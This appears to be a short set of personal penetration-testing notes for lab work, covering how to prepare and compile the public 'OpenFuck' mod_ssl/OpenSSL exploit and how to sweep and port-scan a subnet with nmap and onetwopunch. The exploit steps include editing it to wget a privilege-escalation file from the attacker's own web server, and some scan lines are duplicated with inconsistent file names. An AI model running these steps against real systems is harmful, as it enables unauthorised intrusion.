# pentest
 
**mod_ssl 2.8.7 open ssl exploit (openfuckv2)** (https://www.exploit-db.com/exploits/764)

1. Change location for **ptrace-kmod.c**
at about line 672 - update download location for ptrace-kmod.c file. Ideally, you can host this file on your webserver (eg. attacking machine SimpleHTTPServer) so that when you execute the exploit it will retrieve this dependency to run successfully.
`wget http://your-attacking-ipaddress/ptrace-kmod.c;`

2. install libssl-dev
`apt-get install libssl-dev`

3. compile code
`gcc -o openfuck openfuckV2.c -lcrypto`

4. In your ptrace-kmod.c directory start webserver
`python -m SimpleHTTPServer 80`

---

**Onetwopunch.sh** (https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh)
1. ping sweep for online hosts into list
`nmap -v -sn 10.11.1-254 -oG all-hosts.txt`
`grep Up all-hosts.txt > online.hosts.txt`

2. download onetwopunch script
`wget https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh`
 
3. run script with nmap -sV option
`./scripts/onetwopunch.sh -t online-hosts.txt -p all -i tap0 -n -sV`
 
4. Once complete, navigate to output folder "ndir". Use command to formats all .xml output to html
`for x in $(ls *.xml); do filename=$(echo $x | sed 's/xml/html/') && xsltproc $x -o $filename; done`
`wget https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh`
`./scripts/onetwopunch.sh -t online-hosts.txt -p all -i tap0 -n -sV`

5. Navigate to output folder "ndir" and formats all .xml output to html
`for x in $(ls *.xml); do filename=$(echo $x | sed 's/xml/html/') && xsltproc $x -o $filename; done`